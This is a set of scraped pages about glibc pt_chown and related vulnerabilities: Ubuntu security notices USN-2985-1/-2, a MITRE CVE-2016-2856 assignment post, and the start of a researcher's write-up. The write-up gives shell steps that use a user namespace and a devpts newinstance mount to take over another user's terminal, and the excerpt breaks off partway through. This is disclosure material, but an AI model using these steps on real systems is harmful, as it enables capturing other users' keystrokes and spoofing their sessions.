leading to an application crash) or possibly execute arbitrary code.

([CVE-2014-9761](/security/CVE-2014-9761))

Arjun Shankar discovered that in certain situations the nss\_dns code in the

GNU C Library did not properly account buffer sizes when passed an

unaligned buffer. An attacker could use this to cause a denial of service

or possibly execute arbitrary code. ([CVE-2015-1781](/security/CVE-2015-1781))

Sumit Bose and Lukas Slebodnik discovered that the Name Service

Switch (NSS) implementation in the GNU C Library did not handle long

lines in the files databases correctly. A local attacker could use

this to cause a denial of service (application crash) or possibly

execute arbitrary code. ([CVE-2015-5277](/security/CVE-2015-5277))

Adam Nielsen discovered that the strftime function in the GNU C Library did

not properly handle out-of-range argument data. An attacker could use this

to cause a denial of service (application crash) or possibly expose

sensitive information. ([CVE-2015-8776](/security/CVE-2015-8776))

Hector Marco and Ismael Ripoll discovered that the GNU C Library allowed

the pointer-guarding protection mechanism to be disabled by honoring the

LD\_POINTER\_GUARD environment variable across privilege boundaries. A local

attacker could use this to exploit an existing vulnerability more easily.

([CVE-2015-8777](/security/CVE-2015-8777))

Szabolcs Nagy discovered that the hcreate functions in the GNU C Library

did not properly check its size argument, leading to an integer overflow.

An attacker could use to cause a denial of service (application crash) or

possibly execute arbitrary code. ([CVE-2015-8778](/security/CVE-2015-8778))

Maksymilian Arciemowicz discovered a stack-based buffer overflow in the

catopen function in the GNU C Library when handling long catalog names. An

attacker could use this to cause a denial of service (application crash) or

possibly execute arbitrary code. ([CVE-2015-8779](/security/CVE-2015-8779))

Florian Weimer discovered that the getnetbyname implementation in the GNU C

Library did not properly handle long names passed as arguments. An attacker

could use to cause a denial of service (stack exhaustion leading to an

application crash). ([CVE-2016-3075](/security/CVE-2016-3075))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 15.10

* [libc6](https://launchpad.net/ubuntu/%2Bsource/glibc)
  -
  [2.21-0ubuntu4.2](https://launchpad.net/ubuntu/%2Bsource/glibc/2.21-0ubuntu4.2)
* [libc6-dev](https://launchpad.net/ubuntu/%2Bsource/glibc)
  -
  [2.21-0ubuntu4.2](https://launchpad.net/ubuntu/%2Bsource/glibc/2.21-0ubuntu4.2)

##### Ubuntu 14.04

* [libc6](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.19-0ubuntu6.8](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.19-0ubuntu6.8)
* [libc6-dev](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.19-0ubuntu6.8](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.19-0ubuntu6.8)

##### Ubuntu 12.04

* [libc6](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.15-0ubuntu10.14](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.15-0ubuntu10.14)
* [libc6-dev](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.15-0ubuntu10.14](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.15-0ubuntu10.14)

After a standard system update you need to reboot your computer to

make all the necessary changes.

## References

* [CVE-2013-2207](/security/CVE-2013-2207)
* [CVE-2014-8121](/security/CVE-2014-8121)
* [CVE-2014-9761](/security/CVE-2014-9761)
* [CVE-2015-1781](/security/CVE-2015-1781)
* [CVE-2015-5277](/security/CVE-2015-5277)
* [CVE-2015-8776](/security/CVE-2015-8776)
* [CVE-2015-8777](/security/CVE-2015-8777)
* [CVE-2015-8778](/security/CVE-2015-8778)
* [CVE-2015-8779](/security/CVE-2015-8779)
* [CVE-2016-2856](/security/CVE-2016-2856)
* [CVE-2016-3075](/security/CVE-2016-3075)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from www.ubuntu.com_11174e52_20250124_204519.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-2985-2: GNU C Library regression

26 May 2016

USN-2985-1 introduced a regression in the GNU C Library.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 15.10](/security/notices?release=wily)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)
* [Ubuntu 12.04](/security/notices?release=precise)

## Packages

* [eglibc](/security/cves?package=eglibc) - GNU C Library
* [glibc](/security/cves?package=glibc) - GNU C Library

## Details

USN-2985-1 fixed vulnerabilities in the GNU C Library. The fix for

[CVE-2014-9761](/security/CVE-2014-9761) introduced a regression which affected applications that

use the libm library but were not fully restarted after the upgrade.

This update removes the fix for [CVE-2014-9761](/security/CVE-2014-9761) and a future update

will be provided to address this issue.

We apologize for the inconvenience.

Original advisory details:

Martin Carpenter discovered that pt\_chown in the GNU C Library did not

properly check permissions for tty files. A local attacker could use this

to gain administrative privileges or expose sensitive information.

([CVE-2013-2207](/security/CVE-2013-2207), [CVE-2016-2856](/security/CVE-2016-2856))

Robin Hack discovered that the Name Service Switch (NSS) implementation in

the GNU C Library did not properly manage its file descriptors. An attacker

could use this to cause a denial of service (infinite loop).

([CVE-2014-8121](/security/CVE-2014-8121))

Joseph Myers discovered that the GNU C Library did not properly handle long

arguments to functions returning a representation of Not a Number (NaN). An

attacker could use this to cause a denial of service (stack exhaustion

leading to an application crash) or possibly execute arbitrary code.

([CVE-2014-9761](/security/CVE-2014-9761))

Arjun Shankar discovered that in certain situations the nss\_dns code in the

GNU C Library did not properly account buffer sizes when passed an

unaligned buffer. An attacker could use this to cause a denial of service

or possibly execute arbitrary code. ([CVE-2015-1781](/security/CVE-2015-1781))

Sumit Bose and Lukas Slebodnik discovered that the Name Service

Switch (NSS) implementation in the GNU C Library did not handle long

lines in the files databases correctly. A local attacker could use

this to cause a denial of service (application crash) or possibly

execute arbitrary code. ([CVE-2015-5277](/security/CVE-2015-5277))

Adam Nielsen discovered that the strftime function in the GNU C Library did

not properly handle out-of-range argument data. An attacker could use this

to cause a denial of service (application crash) or possibly expose

sensitive information. ([CVE-2015-8776](/security/CVE-2015-8776))

Hector Marco and Ismael Ripoll discovered that the GNU C Library allowed

the pointer-guarding protection mechanism to be disabled by honoring the

LD\_POINTER\_GUARD environment variable across privilege boundaries. A local

attacker could use this to exploit an existing vulnerability more easily.

([CVE-2015-8777](/security/CVE-2015-8777))

Szabolcs Nagy discovered that the hcreate functions in the GNU C Library

did not properly check its size argument, leading to an integer overflow.

An attacker could use to cause a denial of service (application crash) or

possibly execute arbitrary code. ([CVE-2015-8778](/security/CVE-2015-8778))

Maksymilian Arciemowicz discovered a stack-based buffer overflow in the

catopen function in the GNU C Library when handling long catalog names. An

attacker could use this to cause a denial of service (application crash) or

possibly execute arbitrary code. ([CVE-2015-8779](/security/CVE-2015-8779))

Florian Weimer discovered that the getnetbyname implementation in the GNU C

Library did not properly handle long names passed as arguments. An attacker

could use to cause a denial of service (stack exhaustion leading to an

application crash). ([CVE-2016-3075](/security/CVE-2016-3075))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 15.10

* [libc-bin](https://launchpad.net/ubuntu/%2Bsource/glibc)
  -
  [2.21-0ubuntu4.3](https://launchpad.net/ubuntu/%2Bsource/glibc/2.21-0ubuntu4.3)
* [libc6](https://launchpad.net/ubuntu/%2Bsource/glibc)
  -
  [2.21-0ubuntu4.3](https://launchpad.net/ubuntu/%2Bsource/glibc/2.21-0ubuntu4.3)
* [libc6-dev](https://launchpad.net/ubuntu/%2Bsource/glibc)
  -
  [2.21-0ubuntu4.3](https://launchpad.net/ubuntu/%2Bsource/glibc/2.21-0ubuntu4.3)

##### Ubuntu 14.04

* [libc-bin](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.19-0ubuntu6.9](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.19-0ubuntu6.9)
* [libc6](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.19-0ubuntu6.9](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.19-0ubuntu6.9)
* [libc6-dev](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.19-0ubuntu6.9](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.19-0ubuntu6.9)

##### Ubuntu 12.04

* [libc-bin](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.15-0ubuntu10.15](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.15-0ubuntu10.15)
* [libc6](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.15-0ubuntu10.15](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.15-0ubuntu10.15)
* [libc6-dev](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.15-0ubuntu10.15](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.15-0ubuntu10.15)

After a standard system update you need to reboot your computer to

make all the necessary changes.

## References

* <https://launchpad.net/bugs/1585614>

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from www.openwall.com_3b3948bf_20250124_204517.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[<thread-prev]](../../../2016/02/28/5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <20160307020338.CD55A6C0709@smtpvmsrv1.mitre.org>
Date: Sun,  6 Mar 2016 21:03:38 -0500 (EST)
From: cve-assign@...re.org
To: oss-security@...ts.openwall.com
Cc: cve-assign@...re.org
Subject: Re: Access to /dev/pts devices via pt_chown and user namespaces

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> <http://www.halfdog.net/Security/2015/PtChownArbitraryPtsAccessViaUserNamespace/>

> <http://www.openwall.com/lists/oss-security/2016/02/23/3>

> ... condition can be easily created by creating an user namespace,
> mounting devpts with the newinstance option, create master and slave
> pts pairs until the number overlaps with a target pts outside the
> namespace on the host, where there is interest to gain ownership and
> then invoke pt_chown.
>
> ... intercept all keystrokes and display faked output from
> commands never really executed.

>> <http://www.openwall.com/lists/oss-security/2016/02/23/7>

>> glibc documentation clearly states that "the use of pt_chown introduces
>> additional security risks to the system and you should enable it only
>> if you understand and accept those risks":
>> <https://www.gnu.org/software/libc/manual/html_node/Configuring-and-compiling.html#index-grantpt-1>

>>> <http://www.openwall.com/lists/oss-security/2016/02/24/5>

>>> So for pt_chown, this could hopefully be
>>> just an Ubuntu issue. Should we assign an CVE for that?

>>>> <http://www.openwall.com/lists/oss-security/2016/02/24/10>
>>>> And Debian 8

We think this is currently the best option. Use CVE-2016-2856. This
CVE is about the specific pt_chown finding in the
PtChownArbitraryPtsAccessViaUserNamespace document. Also, we do not
want this to be considered an upstream glibc vulnerability.

(In addition, this CVE is not about whether the pt_chown program
should exist at all, or about whether all users should be able to
create user namespaces. Each of those is an important security topic,
but the importance is a consequence of multiple issues that could be
associated with multiple CVEs.)

The initial CVE-2016-2856 description might look roughly like:

   pt_chown in the glibc package before 2.19-18+deb8u4 on Debian
   jessie lacks a namespace check associated with file-descriptor
   passing, which allows local users to capture keystrokes and spoof
   data, and possibly gain privileges, via pts read and write
   operations, related to debian/sysdeps/linux.mk. NOTE: this is not
   considered a vulnerability in the upstream GNU C Library because
   the upstream documentation has a clear security recommendation
   against the --enable-pt_chown option.

See the
<http://anonscm.debian.org/cgit/pkg-glibc/glibc.git/commit/?h=jessie&id=09f7764882a81e13e7b5d87d715412283a6ce403>
and
<http://anonscm.debian.org/cgit/pkg-glibc/glibc.git/commit/?h=jessie&id=11475c083282c1582c4dd72eecfcb2b7d308c958>
commits. Here, Debian jessie is just an example; a similar statement
might be made about Ubuntu Wily Werewolf, etc. The
09f7764882a81e13e7b5d87d715412283a6ce403 commit can be associated with
(at least) two CVE IDs that motivated the change: CVE-2013-2207 (which
is directly mentioned there) and the new CVE-2016-2856.

>>> On the other hand, the TIOCGPTN ioctl still is problematic with
>>> USERNS, also for other tools. I just started with pt_chown for
>>> demonstration because it is SUID, perhaps there are other programs
>>> using this ioctl.
>>>
>>> Should information about this risk/attack method just be added to the
>>> kernel docs/man-page of TIOCGPTN or is it a separate vulnerability
>>> with need for addressing (another CVE?).

We don't feel that enough information has been sent to reach a
conclusion about whether the "kernel should prevent the TIOCGPTN ioctl
when invoked called by a process within one namespace but acting on a
filedescriptor from a devpts instance mounted in a different
namespace" recommendation should have a CVE ID. We could, for example,
assign separate CVE IDs to other affected applications (if any)
instead.

- --
CVE Assignment Team
M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
[ A PGP key is available for encrypted communications at
  <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJW3ODUAAoJEL54rhJi8gl5zaUP/RRwv6Npic0DYvGFwqCQZq9v
hH5QeGvA6ZYCETdAfsN73wmZ9GlhiXMWwTprDf4Zq3r5yfTzfFzrN7f5hu1hTOPa
/Eonam4l+OML+IymPl85e0wqifeVyJAQj1mk1KYB9tk5jBYcxxARpI3RRt7iC0Jp
+HLo7ayQcEmIE+6XxcVW0C4A5ahBFq75mceqPdJmluNmcBQxx5RHGvJPVeAAAEQA
ccFyqR1lCHlU29WifN99KUjrBzIzR/WzJFvmyL+g8fD7/nA4iT08S8wQf9HbPncv
puFdPn0q23bRwHtH0uOjpdG6V4rWFgSreZW8r+U6xeDYO1yk+uVL1I99s+/0iquH
ghlU4JtbKt8v4nBobh8JGrwdncdpvvS5ojZ9KPVgeBPhe1LAUQRKqiiaAsjRtlDl
tCdIsTnMYV530D9ykw6c82am7Y2ZAW9Tiov6Ug9fHsItAaWMiNzl+AXSMZ6qRPSK
vw0zLIOn4xh9dMKr9VbXN1WX/i/aR6Nbn2ZE7rSF8UlPlff83UeFYhVJ+20iAMXq
sDINreZzpcXRITlsX7h7BDumyrYbNcwNgQMqp9YYV35nA8i4FJubGGHzUAlhrdIh
UF7k+w7nmFN/kgsE0I6Lyi1Ow04F1KvsJfM4+aV/032liDxle7XPl6sZwsOlH7p0
uUXK4WJDDt3SBJQIap5W
=YYhd
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.halfdog.net_dc4685c5_20250124_204511.html ===

[www.halfdog.net](/) /
[Security](/Security/) /
[2015](/Security/2015/) / PtChownArbitraryPtsAccessViaUserNamespace /

Share via
[f](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.halfdog.net%2FSecurity%2F2015%2FPtChownArbitraryPtsAccessViaUserNamespace%2F&t=pt_chown%20arbitrary%20pts%20access%20via%20user%20namespace "facebook")
[g+](https://plus.google.com/share?url=https://www.halfdog.net/Security/2015/PtChownArbitraryPtsAccessViaUserNamespace/ "google+")
# Introduction

## Problem description:

With Ubuntu Wily and earlier, */usr/lib/pt\_chown*
was used to change ownership of slave pts devices in */dev/pts*
to the same uid holding the master file descriptor for the slave.
This is done using the *pt\_chown* SUID binary, which invokes
the *ptsname* function on the master-fd, thus again performing
a *TIOCGPTN ioctl* to get the slave pts number. Using the
result from the ioctl, the pathname of the slave pts is constructed
and *chown* invoked on it, see *login/programs/pt\_chown.c*:

pty = ptsname (PTY\_FILENO);
if (pty == NULL)
...
/\* Get the group ID of the special `tty' group. \*/
p = getgrnam (TTY\_GROUP);
gid = p ? p->gr\_gid : getgid ();
/\* Set the owner to the real user ID, and the group to that special
group ID. \*/
if (chown (pty, getuid (), gid) < 0)
return FAIL\_EACCES;
/\* Set the permission mode to readable and writable by the owner,
and writable by the group. \*/
if ((st.st\_mode & ACCESSPERMS) != (S\_IRUSR|S\_IWUSR|S\_IWGRP)
&& chmod (pty, S\_IRUSR|S\_IWUSR|S\_IWGRP) < 0)
return FAIL\_EACCES;
return 0;

The logic above is severely flawed, when there can be more
than one master/slave pair having the same number and thus same
name. But this condition can be easily created by creating an
user namespace, mounting *devpts* with the *newinstance*
option, create master and slave pts pairs until the number overlaps
with a target pts outside the namespace on the host, where there
is interest to gain ownership and then invoke *pt\_chown*.

# Methods

Exploitation is trivial: At first use any
user namespace demo to create the namespace needed, e.g.
[UserNamespaceExec.c](/Misc/Utils/UserNamespaceExec.c)
and work with standard shell commands, e.g. to take over
*/dev/pts/0*:

test# who am I
test pts/1 2015-12-27 12:00
test# ./UserNamespacesExec -- /bin/bash
Setting uid map in /proc/5783/uid\_map
Setting gid map in /proc/5783/gid\_map
euid: 0, egid: 0
euid: 0, egid: 0
root# mkdir mnt
root# mount -t devpts -o newinstance /dev/pts mnt
root# cd mnt
root# chmod 0666 ptmx

Use a second shell to continue:

test# cd /proc/5783/cwd
test# ls -al
total 4
drwxr-xr-x 2 root root 0 Dec 27 12:48 .
drwxr-xr-x 7 test users 4096 Dec 27 11:57 ..
c--------- 1 test users 5, 2 Dec 27 12:48 ptmx
test# exec 3<>ptmx
test# ls -al
total 4
drwxr-xr-x 2 root root 0 Dec 27 12:48 .
drwxr-xr-x 7 test users 4096 Dec 27 11:57 ..
